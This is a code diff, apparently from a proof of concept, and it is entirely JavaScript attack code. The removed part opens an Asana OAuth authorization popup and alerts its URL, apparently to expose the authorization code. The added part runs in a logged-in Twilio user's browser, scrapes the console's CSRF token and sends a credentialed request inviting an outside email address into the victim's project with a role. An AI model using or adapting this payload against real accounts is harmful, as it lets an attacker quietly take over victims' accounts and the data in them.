@@ -1,4 +1,22 @@
- var popwin = window.open('https://app.asana.com/-/oauth_authorize?state=5JCM5LeJ4pWc55Om47y77YKN6bCi47qW5q%252Bq5I2F54WQ4riN64WI4b%252BC5aeW5YSF6Zmc67Cj7KeU652r47ue66%252Bh4Lep5pGw5Laz4KSB472K5Ia15Li97Lyb6q%252BK4paS&scope=default&redirect_uri=https://zendesk.integrations.asana.plus/v1/auth/flow/asana/callback-a&client_id=1199943984259428&code_challenge=OYC2xWcGJ3KefZZS3hBSfqmCLcRUKQejBjhiv_O9_OE&code_challenge_method=S256&response_type=code', "main_browser");
- setTimeout(function(){
- 	alert(popwin.location.href);
-}, 4000);
+let req = new XMLHttpRequest();
+let url = "https://www.twilio.com/console?__override_layout__=embed";
+req.open("GET", url);
+req.send();
+req.onload = function (e) {
+if (req.readyState === XMLHttpRequest.DONE && req.status === 200) {
+    page = req.responseText;
+    var token = (page.match(/name="csrfToken" content="(.*?)"/)[0].replace('name="csrfToken" content="', '').replace('"', '') );
+    }
+       var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/www.twilio.com\/console\/project\/settings\/invitations", true);
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
+        xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
+        xhr.setRequestHeader("X-Twilio-Csrf", token);
+        xhr.withCredentials = true;
+        var body = "{\"email\":\"hxo1@pm.me\",\"roles\":[\"RL00000000000000000000000000000002\"]}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+}
